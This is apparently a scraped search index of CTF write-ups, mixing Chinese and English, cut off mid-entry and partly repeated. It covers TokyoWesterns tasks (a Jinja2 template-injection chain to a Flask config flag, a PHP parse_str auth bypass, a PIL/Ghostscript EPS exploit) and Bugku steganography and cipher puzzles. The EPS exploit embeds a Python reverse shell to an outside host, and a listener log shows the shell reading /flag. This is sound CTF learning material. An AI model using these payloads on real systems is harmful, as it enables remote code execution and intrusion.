obj ) print ( obj ) else : if obj in visited_objs : return visited_objs . append ( obj ) # attributes for name in dir ( obj ): if name . startswith ( '__' ) and name . endswith ( '__' ): if name not in ( '__globals__' , '__class__' , '__self__' , '__weakref__' , '__objclass__' , '__module__' ): continue attr = getattr ( obj , name ) yield from visit ( attr , '{}.{}' . format ( path , name ), depth + 1 ) # dict values if hasattr ( obj , 'items' ) and callable ( obj . items ): try : for k , v in obj . items (): yield from visit ( v , '{}[{}]' . format ( path , repr ( k )), depth ) except : pass # items elif isinstance ( obj , ( set , list , tuple , frozenset )): for i , v in enumerate ( obj ): yield from visit ( v , '{}[{}]' . format ( path , repr ( i )), depth ) yield from visit ( obj ) \u540c\u65f6\u4fee\u6539app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os from flask import request from search import search app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = 'TWCTF_FLAG' @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): for path , obj in search ( request , 10 ): if str ( obj ) == app . config [ 'FLAG' ]: return path if __name__ == '__main__' : app . run ( debug = True ) (tql\u8fd9\u4e2a\u5199\u7684) 1 2 3 4 5 6 7 $ python3 app . py & $ curl 0 : 5000 / shrine / 123 obj . application . __self__ . _get_data_for_json . __globals__ [ 'json' ] . JSONEncoder . default . __globals__ [ 'current_app' ] . config [ 'FLAG' ] $ curl - g \"http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\" TWCTF { pray_f0r_sacred_jinja2 }","title":"shrine"},{"location":"writeup/TokyoCTF/#_1","text":"http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__}} \u7136\u540e\u641c\u7d22\uff1a After (CTRL+F)ed \u201cFlask\u201d word i just found an interesting variable called:current_app \u8bbf\u95ee\uff1a http://shrine.chal.ctf.westerns.tokyo/shrine/ > {{url_for. globals .current_app}} It means that we are in the application app.py again, so let\u2019s try to get in config now! 1 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__.current_app.config}} \u6210\u529f\uff01 shrine","title":"\u53e6\u4e00\u79cd\u89e3\u6cd5"},{"location":"writeup/TokyoCTF/#simpleauth","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php require_once 'flag.php' ; if ( ! empty ( $_SERVER [ 'QUERY_STRING' ])) { $query = $_SERVER [ 'QUERY_STRING' ]; $res = parse_str ( $query ); if ( ! empty ( $res [ 'action' ])){ $action = $res [ 'action' ]; } } if ( $action === 'auth' ) { if ( ! empty ( $res [ 'user' ])) { $user = $res [ 'user' ]; } if ( ! empty ( $res [ 'pass' ])) { $pass = $res [ 'pass' ]; } if ( ! empty ( $user ) && ! empty ( $pass )) { $hashed_password = hash ( 'md5' , $user . $pass ); } if ( ! empty ( $hashed_password ) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e' ) { echo $flag ; } else { echo 'fail :(' ; } } else { highlight_file ( __FILE__ ); } ?> \u6784\u9020URL 1 http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e","title":"SimpleAuth"},{"location":"writeup/TokyoCTF/#slack-emoji-converter","text":"\u5f97\u5230\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from flask import ( Flask , render_template , request , redirect , url_for , make_response , ) from PIL import Image import tempfile import os app = Flask ( __name__ ) @app.route ( '/' ) def index (): return render_template ( 'index.html' ) @app.route ( '/source' ) def source (): return open ( __file__ ) . read () @app.route ( '/conv' , methods = [ 'POST' ]) def conv (): f = request . files . get ( 'image' , None ) if not f : return redirect ( url_for ( 'index' )) ext = f . filename . split ( '.' )[ - 1 ] fname = tempfile . mktemp ( \"emoji\" ) fname = \"{}.{}\" . format ( fname , ext ) f . save ( fname ) img = Image . open ( fname ) w , h = img . size r = 128 / max ( w , h ) newimg = img . resize (( int ( w * r ), int ( h * r ))) newimg . save ( fname ) response = make_response () response . data = open ( fname , \"rb\" ) . read () response . headers [ 'Content-Disposition' ] = 'attachment; filename=emoji_{}' . format ( f . filename ) os . unlink ( fname ) return response if __name__ == '__main__' : app . run ( host = \"0.0.0.0\" , port = 8080 , debug = True ) it uses the PIL library which has been known to have RCEs by maliciously crafting image ( CVE-2017-8291 ). I\u2019ve been searching on google and found this interesting issue request that was written in seclists.org last month. 1 2 3 4 5 6 7 8 9 10 %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 30 30 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"harold.kim\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops The result? well\u2026 1 2 3 4 5 6 7 8 9 root@imouto-router:/# nc -vlp 8080 Listening on [0.0.0.0] (family 0, port 8080) Connection from 45.123.200.35.bc.googleusercontent.com 53674 received! /bin/sh: 0: can't access tty; job control turned off $ cat /flag TWCTF{watch_0ut_gh0stscr1pt_everywhere}$ id uid=1000(emoji) gid=1000(emoji) groups=1000(emoji) $ exit root@imouto-router:/# (\u4e0d\u7406\u89e3)","title":"slack emoji converter"},{"location":"writeup/TokyoCTF/#pysandbox1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import sys import ast blacklist = [ ast . Call , ast . Attribute ] def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : \"\"\" expr = BoolOp(boolop op, expr* values) | BinOp(expr left, operator op, expr right) | UnaryOp(unaryop op, expr operand) | Lambda(arguments args, expr body) | IfExp(expr test, expr body, expr orelse) | Dict(expr* keys, expr* values) | Set(expr* elts) | ListComp(expr elt, comprehension* generators) | SetComp(expr elt, comprehension* generators) | DictComp(expr key, expr value, comprehension* generators) | GeneratorExp(expr elt, comprehension* generators) -- the grammar constrains where yield expressions can occur | Yield(expr? value) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare(expr left, cmpop* ops, expr* comparators) | Call(expr func, expr* args, keyword* keywords, expr? starargs, expr? kwargs) | Repr(expr value) | Num(object n) -- a number as a PyObject. | Str(string s) -- need to specify raw, unicode, etc? -- other literals? bools? -- the following expression can appear in assignment context | Attribute(expr value, identifier attr, expr_context ctx) | Subscript(expr value, slice slice, expr_context ctx) | Name(identifier id, expr_context ctx) | List(expr* elts, expr_context ctx) | Tuple(expr* elts, expr_context ctx) -- col_offset is the byte offset in the utf8 string the parser uses attributes (int lineno, int col_offset) \"\"\" attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' ], 'SetComp' : [ 'elt' ], 'DictComp' : [ 'key' , 'value' ], 'GeneratorExp' : [ 'elt' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . read () body = ast . parse ( expr ) . body if check ( body ): sys . stdout . write ( repr ( eval ( expr ))) else : sys . stdout . write ( \"Invalid input\" ) sys . stdout . flush ()","title":"pysandbox1"},{"location":"writeup/TokyoCTF/#_2","text":"ctftime \u5b89\u5168\u5ba2 writeup exploitdb wp","title":"\u53c2\u8003"},{"location":"writeup/bugku/","text":"bugku \u00b6 \u591a\u5f69 \u00b6 zsteg \u63d0\u53d6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ zsteg -a 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy .. text: \"flag.txt\" b2,g,lsb,xy .. file: 5View capture file b2,g,msb,xy .. file: VISX image file b2,b,msb,xy .. text: \"UUuUUWUUUUUuUUUU\" b2,bgr,lsb,xy .. text: \"AAAP@QUDQ\" b3,b,lsb,xy .. file: GLS_BINARY_MSB_FIRST b4,r,lsb,xy .. text: \"UDTTUEEDDEDEUEDDTEDETDEDDEDDDDTDUEEETDUDEUDDDDDDDDDDDDUDDDDDDDDDDDDDDDDDDDD\\\"322\\\"223##\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"#\\\"#\\\"\\\"\\\"3\\\"#\" b4,r,msb,xy .. text: \"333333333;\" b4,g,lsb,xy .. file: 5View capture file b4,g,msb,xy .. file: VISX image file b4,b,msb,xy .. text: [\"w\" repeated 12 times] b6,g,msb,xy .. text: \"4ES4EQ4MS4M\" Passing the -v flag into zsteg, we can get the hex dump of that extraction: \u63d0\u53d6 flag.txt \u5904\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 zsteg -v 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy b1,bgr,lsb,xy .. text: \"flag.txt\" 00000000: 00 00 00 00 00 00 00 e3 50 4b 03 04 14 00 01 08 |........PK......| 00000010: 08 00 70 42 67 4c 37 20 ff 48 4d 00 00 00 43 00 |..pBgL7 .HM...C.| 00000020: 00 00 08 00 00 00 66 6c 61 67 2e 74 78 74 ce 98 |......flag.txt..| 00000030: 5e 65 7a ba 27 91 a6 eb 1b 25 54 f3 b9 6d 0f ca |^ez.'....%T..m..| 00000040: 78 7c 20 6a 79 e8 39 99 c8 df ad 3d 9a c8 4b fc |x| jy.9....=..K.| 00000050: 53 1d db 6e 95 9d 07 ae 1c 91 eb fe a7 18 33 00 |S..n..........3.| 00000060: 9e f5 12 8e 7f c6 e6 7e 1a c8 3d cf 94 97 2f b0 |.......~..=.../.| 00000070: 96 64 f3 a7 d1 94 64 23 98 3f 47 50 4b 01 02 3f |.d....d#.?GPK..?| 00000080: 00 14 00 01 08 08 00 70 42 67 4c 37 20 ff 48 4d |.......pBgL7 .HM| 00000090: 00 00 00 43 00 00 00 08 00 24 00 00 00 00 00 00 |...C.....$......| 000000a0: 00 20 00 00 00 00 00 00 00 66 6c 61 67 2e 74 78 |. .......flag.tx| 000000b0: 74 0a 00 20 00 00 00 00 00 01 00 18 00 5b d9 a1 |t.. .........[..| 000000c0: f6 a9 b5 d3 01 a5 f5 f6 76 a9 b5 d3 01 a5 f5 f6 |........v.......| 000000d0: 76 a9 b5 d3 01 50 4b 05 06 00 00 00 00 01 00 01 |v....PK.........| 000000e0: 00 5a 00 00 00 73 00 00 00 00 00 92 49 24 92 49 |.Z...s......I$.I| 000000f0: 24 92 49 24 92 49 24 92 49 24 92 49 24 92 49 24 |$.I$.I$.I$.I$.I$| On the top there's PK, that's the magic byte for zip! A zip hidden in lsb. (\u602a\u4e0d\u5f97binwalk\u63d0\u53d6\u4e0d\u51fa\u6765) 1 2 3 4 5 6 7 8 9 10 $ zsteg 603fda27-2893-4e60-9d9f-39962b8c8440.png -E b1,bgr,lsb,xy > out $ binwalk -e out $ cd _out.extracted $ 7z l 8.zip Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 ....A 67 77 flag.txt ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 67 77 1 files \u538b\u7f29\u5305\u6709\u5bc6\u7801\u3002 Looking through the color channels again in StegSolve, this turns up: YSL: Yves Saint Laurent. A recognizable fashion brand which sells lipstick. This may lead us to something predictable! \u67e5\u627e\u53e3\u7ea2\u8272\u53f7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 { \"rgb(188, 11, 40)\" : \"1 Le Rouge - Blood Red (Satin)\" , \"rgb(184, 52, 75)\" : \"04 Rouge Vermillon - Raspberry Red (Satin)\" , \"rgb(221, 136, 133)\" : \"06 Rose Bergamasque - Delicate Nude Pink (Satin)\" , \"rgb(207, 26, 119)\" : \"7 Le Fuchsia - Pure Saturated Fuschia (Satin)\" , \"rgb(206, 135, 133)\" : \"10 Beige Tribute - Dark Nude (Satin)\" , \"rgb(194, 105, 111)\" : \"11 Rose Carnation - Soft Peony Rose (Satin)\" , \"rgb(213, 29, 55)\" : \"13 Le Orange - Bright Orange (Satin)\" , \"rgb(234, 94, 107)\" : \"17 Rose Dahlia - Coral Orange (Satin)\" , \"rgb(161, 24, 96)\" : \"19 Fuchsia Pink - Bright Fuschia Pink (Satin)\" , \"rgb(238, 133, 199)\" : \"22 Pink Celebration - Bubble Gum Pink (Satin)\" , \"rgb(235, 130, 98)\" : \"23 Coral Poetique - Pink Coral (Satin)\" , \"rgb(233, 152, 131)\" : \"24 Blond Ingenu - Frosted Coral (Satin)\" , \"rgb(218, 116, 155)\" : \"26 Rose Libertin - Bright Purple Pink (Satin)\" , \"rgb(208, 65, 121)\" : \"27 Fuchsia Innocent - Hot Pink (Satin)\" , \"rgb(235, 105, 92)\" : \"36 Corail Legende - Orange Coral (Satin)\" , \"rgb(202, 102, 174)\" : \"49 Tropical Pink - Hot Pink (Satin)\" , \"rgb(212, 18, 29)\" : \"50 Rouge Neon - Bright Red (Satin)\" , \"rgb(235, 85, 71)\" : \"51 Corail Urbain - Medium Peach Orange (Satin)\" , \"rgb(246, 98, 96)\" : \"52 Rosy Coral - Rosy Coral (Satin)\" , \"rgb(126, 69, 58)\" : \"53 Beige Promenade - Browd Red (Satin)\" , \"rgb(94, 35, 41)\" : \"54 Prune Avenue - Dark Maroon (Satin)\" , \"rgb(193, 9, 43)\" : \"56 Orange Indie - Mauve (Satin)\" , \"rgb(192, 8, 62)\" : \"57 Luminous Pink - Magenta (Satin)\" , \"rgb(165, 63, 103)\" : \"58 Luminous Mauve - Bubblegum Pink (Satin)\" , \"rgb(212, 122, 111)\" : \"59 Golden Melon - Golden Orange (Satin)\" , \"rgb(170, 64, 64)\" : \"66 Rosewood - Soft Pink Nude (Satin)\" , \"rgb(220, 53, 77)\" : \"67 Rouge Heroine - Gold Metallic (Satin)\" , \"rgb(203, 132, 123)\" : \"70 Le Nu - Basic Nude (Satin)\" , \"rgb(148, 23, 41)\" : \"72 Rouge Vinyle - Deep Raspberry (Satin)\" , \"rgb(215, 11, 22)\" : \"73 Rhythm Red - Magenta Pink (Satin)\" , \"rgb(229, 35, 23)\" : \"74 Orange Electro - Electric Orange (Satin)\" , \"rgb(183, 48, 62)\" : \"75 Rose Mix - Deep Rose (Satin)\" , \"rgb(209, 50, 116)\" : \"76 Explicit Pink - Spring Pink (Satin)\" , \"rgb(206, 10, 74)\" : \"77 Fuschia Live - Blush Rose (Satin)\" , \"rgb(161, 0, 6)\" : \"201 Orange Imagine - Orange Red (Matte)\" , \"rgb(161, 0, 52)\" : \"202 Rose Crazy - Cranberry Red (Matte)\" , \"rgb(167, 11, 35)\" : \"203 Rouge Rock - Rich Red (Matte)\" , \"rgb(131, 35, 37)\" : \"204 Rouge Scandal - Maroon Red (Matte)\" , \"rgb(97, 37, 29)\" : \"206 Grenat Satisfaction - Brown Red (Matte)\" , \"rgb(184, 20, 70)\" : \"208 Fuchsia Fetiche - Raspberry Red (Matte)\" , \"rgb(231, 51, 37)\" : \"213 Orange Seventies - Orange with Brown undertones (Matte)\" , \"rgb(215, 91, 89)\" : \"214 Wood On Fire - Pinky Nude (Matte)\" , \"rgb(184, 38, 59)\" : \"216 Red Clash - Mauvey Red (Matte)\" , \"rgb(201, 88, 108)\" : \"217 Nude Trouble - Mauvey Beige (Matte)\" , \"rgb(203, 93, 70)\" : \"218 Coral Remix - Coral Nude (Matte)\" , \"rgb(195, 1, 9)\" : \"219 Rouge Tatouage \u2013 Vibrant Pink Red (Matte)\" , \"rgb(230, 26, 1)\" : \"220 Crazy Tangerine \u2013 Electric Orange (Matte)\" , \"rgb(106, 19, 25)\" : \"222 Black Red Code \u2013 Rust Red (Matte)\" , \"rgb(51, 26, 19)\" : \"225 - Minimal Black - Matte Finish - Black (Matte)\" , \"rgb(165, 106, 92)\" : \"340 Golden Copper - Reddish Pink (Satin)\" , \"rgb(163, 77, 86)\" : \"09 Rose Stiletto - Rich Berry Rose (Satin)\" , \"rgb(92, 47, 44)\" : \"205 Prune Virgin - Burgundy (Matte)\" , \"rgb(174, 67, 95)\" : \"207 Rose Perfecto - Blush Pink (Matte)\" , \"rgb(226, 0, 74)\" : \"211 Decadent Pink - Bright Pink (Matte)\" , \"rgb(126, 32, 50)\" : \"212 Alternative Plum - Burgundy Wine (Matte)\" , \"rgb(207, 44, 125)\" : \"215 Lust For Pink - Purple Bubblegum Pink (Matte)\" , \"rgb(214, 0, 112)\" : \"221 Rose Ink \u2013 Deep Mauve Pink (Matte)\" , \"rgb(232, 11, 44)\" : \"223 Corail Anti-Mainstream \u2013 Neon Coral (Matte)\" , \"rgb(219, 90, 121)\" : \"224 Rose Illicite \u2013 Creamy Dusty Pink (Matte)\" } \u53d6\u8272\uff1a 1 2 3 4 5 6 7 8 from PIL import Image im = Image . open ( '603fda27-2893-4e60-9d9f-39962b8c8440.png' ) rgb_im = im . convert ( 'RGB' ) for x in range ( 0 , 21 ): r , g , b = rgb_im . getpixel (( 50 + ( 150 * x ), 1 )) print ( r , g , b ) \u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 (188, 11, 40) (208, 65, 121) (212, 122, 111) (194, 105, 111) (235, 130, 98) (207, 26, 119) (192, 8, 62) (188, 11, 40) (188, 11, 40) (209, 50, 116) (106, 19, 25) (188, 11, 40) (188, 11, 40) (212, 18, 29) (215, 91, 89) (221, 136, 133) (206, 10, 74) (212, 18, 29) (126, 69, 58) (215, 91, 89) (221, 136, 133) \u67e5\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ IFS=$'\\n'; for i in `cat image-colors` ; do grep $i ./lipsticks.json >> found; done $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' 1 27 59 11 23 7 57 1 1 76 222 1 1 50 214 6 77 50 53 214 6 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | tr -d '\\n' 1275911237571176222115021467750532146 1 2 $ cat found | cut -d: -f1 | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' 1011111101011111001011100010101000101100011010100101010111001000111001010101101011100 1 2 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' | perl -lpe '$_=pack\"B*\",$_' \u767d\u5b66\u5bb6 \u6700\u540e\u5f97\u5230\u5bc6\u7801 \u544a\u8bc9\u4f60\u4e2a\u79d8\u5bc6(ISCCCTF) \u00b6 636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067 \u5341\u516d\u8fdb\u5236\u89e3\u7801\uff1a 1 cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g base64\u89e3\u7801 1 r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM \u8fd9\u4e32\u4e1c\u897f\u5c31\u9700\u8981\u4e00\u70b9\u8111\u6d1e\uff0c\u8fd9\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u5bf9\u7167\u7740\u952e\u76d8\uff0c\u6bd4\u5982r5yg\uff0c\u56f4\u8d77\u6765\u7684\u662ft\uff0clp9i\u56f4\u8d77\u6765\u7684\u662fo\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u540e\u5f97\u51fatongyuan\uff08\u63d0\u4ea4flag\u7684\u65f6\u5019\u63d0\u4ea4\u5927\u5199\u7684TONGYUAN\uff09 \u8fd9\u4e0d\u662fmd5 \u00b6 \u8d1d\u65af\u5bb6\u65cf \u00b6 @iH<,{bdR2H;i6*Tm,Wx2izpx2! \u5206\u6790\uff1a\u9898\u76ee\u8bf4\u662f\u8d1d\u65af(base)\uff0c\u90a3\u5e94\u8be5\u662fbase\u7f16\u7801\u4e4b\u7c7b\u7684\uff0c\u7136\u540e\u6211\u8bd5\u4e86\u4e0bbase64\uff0c\u53d1\u73b0\u4e0d\u5bf9\uff0c\u540e\u6765\u4e86\u89e3\u5230base\u7f16\u7801\u4e0d\u6b62\u6709base64\uff0c\u8fd8\u6709base16,base32\uff0cbase58\uff0cbase62\uff0cbase91\u7b49\uff0c\u90fd\u8bd5\u4e86\u4e00\u904d\uff0c\u53d1\u73b0\u8fd9\u9898\u662f\u7528base91\u89e3\u7801 Github\u4e0a\u627e\u5230\u7684js \u4ee3\u7801 \u5bcc\u5f3a\u6c11\u4e3b \u00b6 \u6765\u81ea\u5b87\u5b99\u7684\u4fe1\u53f7 \u00b6 \u8fd9\u79cd\u4e1c\u897f\u53eb\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u767e\u5ea6\u627e\u5230\u5bf9\u7167\u8868 \u6ef4\u7b54~\u6ef4 \u00b6 \u5bc6\u6587\uff1a -... -.- -.-. - ..-. -- .. ... -.-. \u806a\u660e\u7684\u5c0f\u7f8a \u00b6 \u6805\u680f\u5bc6\u7801\u89e3\u5bc6 ok \u00b6 \u8fd9\u4e0d\u662f\u83ab\u5c14\u65af\u5bc6\u7801 \u00b6 easy Crypto \u00b6 \u7b80\u5355\u52a0\u5bc6 \u00b6 \u4e00\u4e2a\u4e2a\u8bd5\u4e00\u4e0b\u5427 \u6765\u81ea\u4e4c\u4e91\u7684\u9080\u8bf7\u7801 \u00b6 \u4e00\u5f20\u56fe\u7247\uff1a \u795e\u79d8\u7684\u6587\u4ef6 \u00b6 zip\u7684\u660e\u6587\u653b\u51fb \u8bba\u5251 \u00b6 jpg\u683c\u5f0f\uff0cstrings\u770b\u5230\u4e00\u4e32\u4e8c\u8fdb\u5236\u7684\u6570\u636e burp\u53ef\u4ee5\u5b9e\u73b0\u8fde\u7eed\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6 misc \u00b6 \u9690\u5199 \u00b6 \u4fee\u6539\u9ad8\u5ea6 telnet \u00b6 \u7b80\u5355\u5730\u6d41\u91cf\u5206\u6790 \u773c\u89c1\u975e\u5b9e \u00b6 \u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\uff0cfile\u67e5\u770b\u683c\u5f0f\u77e5\u9053\u662fzip\uff0c\u89e3\u538b\u7f29\u4e4b\u540e\u53c8\u662fword\uff0c \u89e3\u538b\u540e\u53bb\u627e\u5c31\u884c \u554a\u54d2 \u00b6 binwalk \u56fe\u7247\u5c5e\u6027\u6709\u5bc6\u7801 \u53c8\u4e00\u5f20\u56fe\u7247 \u00b6 foremost \u00b6 \u53c2\u8003 \u00b6 \u591a\u5f69wp wp wp","title":"bugku"},{"location":"writeup/bugku/#bugku","text":"","title":"bugku"},{"location":"writeup/bugku/#_1","text":"zsteg \u63d0\u53d6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ zsteg -a 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy .. text: \"flag.txt\" b2,g,lsb,xy .. file: 5View capture file b2,g,msb,xy .. file: VISX image file b2,b,msb,xy .. text: \"UUuUUWUUUUUuUUUU\" b2,bgr,lsb,xy .. text: \"AAAP@QUDQ\" b3,b,lsb,xy .. file: GLS_BINARY_MSB_FIRST b4,r,lsb,xy .. text: \"UDTTUEEDDEDEUEDDTEDETDEDDEDDDDTDUEEETDUDEUDDDDDDDDDDDDUDDDDDDDDDDDDDDDDDDDD\\\"322\\\"223##\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"#\\\"#\\\"\\\"\\\"3\\\"#\" b4,r,msb,xy .. text: \"333333333;\" b4,g,lsb,xy .. file: 5View capture file b4,g,msb,xy .. file: VISX image file b4,b,msb,xy .. text: [\"w\" repeated 12 times] b6,g,msb,xy .. text: \"4ES4EQ4MS4M\" Passing the -v flag into zsteg, we can get the hex dump of that extraction: \u63d0\u53d6 flag.txt \u5904\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 zsteg -v 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy b1,bgr,lsb,xy .. text: \"flag.txt\" 00000000: 00 00 00 00 00 00 00 e3 50 4b 03 04 14 00 01 08 |........PK......| 00000010: 08 00 70 42 67 4c 37 20 ff 48 4d 00 00 00 43 00 |..pBgL7 .HM...C.| 00000020: 00 00 08 00 00 00 66 6c 61 67 2e 74 78 74 ce 98 |......flag.txt..| 00000030: 5e 65 7a ba 27 91 a6 eb 1b 25 54 f3 b9 6d 0f ca |^ez.'....%T..m..| 00000040: 78 7c 20 6a 79 e8 39 99 c8 df ad 3d 9a c8 4b fc |x| jy.9....=..K.| 00000050: 53 1d db 6e 95 9d 07 ae 1c 91 eb fe a7 18 33 00 |S..n..........3.| 00000060: 9e f5 12 8e 7f c6 e6 7e 1a c8 3d cf 94 97 2f b0 |.......~..=.../.| 00000070: 96 64 f3 a7 d1 94 64 23 98 3f 47 50 4b 01 02 3f |.d....d#.?GPK..?| 00000080: 00 14 00 01 08 08 00 70 42 67 4c 37 20 ff 48 4d |.......pBgL7 .HM| 00000090: 00 00 00 43 00 00 00 08 00 24 00 00 00 00 00 00 |...C.....$......| 000000a0: 00 20 00 00 00 00 00 00 00 66 6c 61 67 2e 74 78 |. .......flag.tx| 000000b0: 74 0a 00 20 00 00 00 00 00 01 00 18 00 5b d9 a1 |t.. .........[..| 000000c0: f6 a9 b5 d3 01 a5 f5 f6 76 a9 b5 d3 01 a5 f5 f6 |........v.......| 000000d0: 76 a9 b5 d3 01 50 4b 05 06 00 00 00 00 01 00 01 |v....PK.........| 000000e0: 00 5a 00 00 00 73 00 00 00 00 00 92 49 24 92 49 |.Z...s......I$.I| 000000f0: 24 92 49 24 92 49 24 92 49 24 92 49 24 92 49 24 |$.I$.I$.I$.I$.I$| On the top there's PK, that's the magic byte for zip! A zip hidden in lsb. (\u602a\u4e0d\u5f97binwalk\u63d0\u53d6\u4e0d\u51fa\u6765) 1 2 3 4 5 6 7 8 9 10 $ zsteg 603fda27-2893-4e60-9d9f-39962b8c8440.png -E b1,bgr,lsb,xy > out $ binwalk -e out $ cd _out.extracted $ 7z l 8.zip Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 ....A 67 77 flag.txt ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 67 77 1 files \u538b\u7f29\u5305\u6709\u5bc6\u7801\u3002 Looking through the color channels again in StegSolve, this turns up: YSL: Yves Saint Laurent. A recognizable fashion brand which sells lipstick. This may lead us to something predictable! \u67e5\u627e\u53e3\u7ea2\u8272\u53f7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 { \"rgb(188, 11, 40)\" : \"1 Le Rouge - Blood Red (Satin)\" , \"rgb(184, 52, 75)\" : \"04 Rouge Vermillon - Raspberry Red (Satin)\" , \"rgb(221, 136, 133)\" : \"06 Rose Bergamasque - Delicate Nude Pink (Satin)\" , \"rgb(207, 26, 119)\" : \"7 Le Fuchsia - Pure Saturated Fuschia (Satin)\" , \"rgb(206, 135, 133)\" : \"10 Beige Tribute - Dark Nude (Satin)\" , \"rgb(194, 105, 111)\" : \"11 Rose Carnation - Soft Peony Rose (Satin)\" , \"rgb(213, 29, 55)\" : \"13 Le Orange - Bright Orange (Satin)\" , \"rgb(234, 94, 107)\" : \"17 Rose Dahlia - Coral Orange (Satin)\" , \"rgb(161, 24, 96)\" : \"19 Fuchsia Pink - Bright Fuschia Pink (Satin)\" , \"rgb(238, 133, 199)\" : \"22 Pink Celebration - Bubble Gum Pink (Satin)\" , \"rgb(235, 130, 98)\" : \"23 Coral Poetique - Pink Coral (Satin)\" , \"rgb(233, 152, 131)\" : \"24 Blond Ingenu - Frosted Coral (Satin)\" , \"rgb(218, 116, 155)\" : \"26 Rose Libertin - Bright Purple Pink (Satin)\" , \"rgb(208, 65, 121)\" : \"27 Fuchsia Innocent - Hot Pink (Satin)\" , \"rgb(235, 105, 92)\" : \"36 Corail Legende - Orange Coral (Satin)\" , \"rgb(202, 102, 174)\" : \"49 Tropical Pink - Hot Pink (Satin)\" , \"rgb(212, 